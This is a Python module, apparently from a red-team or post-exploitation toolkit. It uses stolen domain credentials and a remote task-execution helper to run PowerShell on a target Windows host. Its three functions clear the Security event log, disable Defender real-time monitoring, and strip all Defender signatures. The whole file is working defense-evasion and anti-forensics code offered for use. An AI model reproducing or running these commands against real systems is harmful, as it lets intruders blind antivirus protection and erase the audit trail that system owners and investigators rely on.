from datetime import datetime, date
from bin import atexec
import os,sys

def time_stamp():
	today = date.today()
	now = datetime.now()
	timestamp = today.strftime('%d %B %Y {}').format(now.strftime("%H:%M:%S"))
	return timestamp

def logclear(domain,user,passw,target,host):
	print('->[+] Attempting Log Clearing On %s' % host)
	timestamp = time_stamp()
	atexec.main('%s/%s:%s@%s' % (domain,user,passw,target),'powershell.exe -c "hostname;wevtutil cl security"','%s - Attempted To Clear WinEvent Logs On %s' % (timestamp,host))

def disableav(domain,user,passw,target,host):
	print('->[+] Attempting To Disable Defender')
	timestamp = time_stamp()
	atexec.main('%s/%s:%s@%s' % (domain,user,passw,target),'powershell.exe -c "Set-MpPreference -DisableRealtimeMonitoring $true;Get-MpPreference|select DisableRealtimeMonitoring"','%s - Attempted To Disable Defender On %s : Set-MpPreference -DisableRealtimeMonitoring $true' % (timestamp,host))

def removedefinitions(domain,user,passw,target,host):
	print('->[+] Attempting To Uninstall Defender Signatures')
	timestamp = time_stamp()
	atexec.main('%s/%s:%s@%s' % (domain,user,passw,target),'powershell.exe -c "C:\\'+'\'Program Files\'\\'+'\'Windows Defender\'\MpCmdRun.exe -removedefinitions -all"','%s - Attempted To Remove Defender Signatures From %s : MpCmdRun.exe -removedefinitions -all' % (timestamp,host))
